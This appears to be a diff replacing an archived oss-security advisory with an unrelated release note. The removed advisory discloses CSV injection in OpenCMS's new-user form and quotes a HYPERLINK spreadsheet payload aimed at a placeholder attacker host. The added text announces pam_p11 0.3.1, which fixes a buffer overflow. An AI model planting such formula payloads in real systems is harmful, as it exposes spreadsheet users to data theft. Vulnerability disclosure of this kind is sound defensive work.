@@ -1,21 +1,19 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/05/05/2
-Message-ID: <CALv8orHZc+_tuwny9g9JGQzX1VBES3L1OYjmdwNzeZNeRWAhJw@mail.gmail.com>
-Date: Sun, 5 May 2019 15:30:22 +0530
-From: Pramod Rana <varchashva@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CSV Injection | Alkacon OpenCMS v10.5.4 and before
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/09/12/1
+Message-ID: <CAO8bUynNGucV2xa-dXjKSS8iNKQ2tupzxSgCQseBa02moykPRA@mail.gmail.com>
+Date: Wed, 11 Sep 2019 23:13:33 +0200
+From: Frank Morgner <frankmorgner@...il.com>
+To: opensc-announce@...ts.sourceforge.net,  OpenSC Development <opensc-devel@...ts.sourceforge.net>, oss-security@...ts.openwall.com
+Subject: pam_p11 0.3.1 released
 Content-Type: text/plain; charset=utf-8
 
-Description
- - OpenCMS v10.5.4 and before is vulnerable to CSV injection in New
-User module for parameter First Name and Last Name
- - Impacted URL is
-http://[your_webserver_ip]/opencms/system/workplace/admin/accounts/user_new.jsp
- - Payload used is
-'=HYPERLINK("http://[attacker_ip:port]/GiveMeSomeData","IAmSafe")'
+Hi all!
 
-Further details
- - https://github.com/alkacon/opencms-core/issues/636
+I'm happy to announce the new pam_p11 release 0.3.1, which can be found
+here https://github.com/OpenSC/pam_p11/releases/tag/pam_p11-0.3.1.
+<https://github.com/OpenSC/pam_p11/releases/tag/pam_p11-0.3.1> This release
+fixes a buffer overflow when creating signatures longer than 256 bytes
+(CVE-2019-16058). This bug is present in pam_p11 version 0.2.0 and 0.3.0.
 
-Already requested for CVE, yet to receive it.
+Regards, Frank.
+
